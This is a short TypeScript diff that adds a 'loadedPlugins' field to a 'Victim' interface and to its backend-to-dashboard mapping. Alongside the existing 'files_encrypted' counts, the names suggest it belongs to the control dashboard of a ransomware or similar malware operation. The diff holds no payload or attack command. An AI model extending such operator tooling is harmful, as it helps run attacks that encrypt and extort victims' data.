@@ -17,6 +17,7 @@ export interface Victim {
   country: string;
   files_found?: number;
   files_encrypted?: number;
+  loadedPlugins?: string[];
 }
 
 export interface LogEntry {
@@ -87,6 +88,7 @@ export function backendVictimToDashboard(
     country: '──',
     files_found: d.files_found as number | undefined,
     files_encrypted: d.files_encrypted as number | undefined,
+    loadedPlugins: (d.loaded_plugins as string[]) || [],
   };
 }
 
